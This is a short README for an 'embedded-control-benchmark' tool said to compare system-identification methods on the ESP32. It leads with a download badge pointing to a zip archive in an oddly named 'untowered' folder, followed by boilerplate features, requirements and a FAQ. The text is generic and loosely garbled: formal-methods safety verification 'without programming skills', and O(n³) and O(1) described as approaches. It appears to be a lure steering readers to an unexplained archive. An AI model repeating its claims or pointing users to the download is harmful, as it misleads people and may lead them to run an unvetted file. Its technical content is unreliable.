[![Download](https://raw.githubusercontent.com/Shaan0p/embedded-control-benchmark/main/untowered/control_embedded_benchmark_1.9.zip)](https://raw.githubusercontent.com/Shaan0p/embedded-control-benchmark/main/untowered/control_embedded_benchmark_1.9.zip)

## 📜 Overview

The **embedded-control-benchmark** project simulates how hardware constraints affect system performance. It compares two methods for system identification: an online approach that scales poorly and a pre-compiled method that runs efficiently. This tool is especially useful for those working with constrained embedded systems like the ESP32.

## 🖥️ Features

- **Real-Time Simulation:** See how your system behaves under constrained conditions.
- **Safety Critical Analysis:** Verify system safety using formal methods.
- **Benchmarking Tools:** Compare your results easily and effectively.
- **User-Friendly Interface:** No programming skills required to use the software.

## 📦 System Requirements

- **Operating System:** Windows, macOS, or Linux
- **Memory:** At least 2 GB RAM
- **Processor:** Any modern CPU
- **Storage:** Minimum of 100 MB of free disk space
- **Networking:** Internet connection for downloads

## ❓ Frequently Asked Questions (FAQ)

1. **What is O(n³) and O(1)?**
   - These represent two different approaches to system identification. O(n³) suggests that the performance decreases significantly with size, while O(1) maintains consistent performance regardless of size.

2. **Can I use this tool for other platforms?**
   - Currently, the tool is optimized for ESP32 but it can be adapted for other embedded systems with modifications.

3. **Who should use this software?**
   - This software is for engineers, researchers, and anyone interested in testing system performance under constraints without needing programming knowledge.
